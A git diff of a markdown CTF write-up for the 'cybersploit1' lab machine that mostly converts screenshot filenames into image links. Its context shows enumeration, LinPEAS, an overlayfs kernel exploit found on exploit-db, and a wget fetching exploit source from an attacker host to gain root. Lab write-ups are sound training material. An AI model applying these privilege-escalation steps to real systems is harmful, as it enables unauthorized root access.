@@ -36,17 +36,17 @@ Nmap done: 1 IP address (1 host up) scanned in 15.65 seconds
 
 Heading to the site we find a GIF and several anchored links:
 
-site.png
+![site.png](../assets/cybersploit1_assets/site.png)
 
 But in the page source we find an interesting comment:
 
-username.png
+![username.png](../assets/cybersploit1_assets/username.png)
 
 Cool, looks like we've found a username, lets keep enumerating. 
 
 Seeing if there is a robots.txt file, we find what appears to be base64:
 
-robots.txt
+![robots.png](../assets/cybersploit1_assets/robots.png)
 
 Lets decode this in the terminal:
 
@@ -85,21 +85,21 @@ cybersploit-CTF
 
 We can now grab the local.txt flag:
 
-user_flag.png
+![user_flag.png](../assets/cybersploit1_assets/user_flag.png)
 
 ### Privilege Escalation
 
 I'll go ahead and transfer LinPEAS over to the target to help find a privilege escalation vector:
 
-transfer.png
+![transfer.png](../assets/cybersploit1_assets/transfer.png)
 
 Linpeas finds a few things of interest, but most interesting is this outdated version:
 
-peas.png
+![peas.png](../assets/cybersploit1_assets/peas.png)
 
 Googling exploits we find this is vulnerable to overlayfs https://www.exploit-db.com/exploits/37292
 
-Lets download this back to our machine and we can transfer it over an compile it on the target.
+Lets download this back to our machine and we can transfer it over and compile it on the target.
 
 ```text
 itsskv@cybersploit-CTF:/tmp$ wget http://192.168.45.158/overlayfs.c
@@ -129,7 +129,7 @@ uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
 
 Nice, that worked! Lets grab the final flag:
 
-root_flag.png
+![root_flag.png](../assets/cybersploit1_assets/root_flag.png)
 
 Thanks for following along!
 
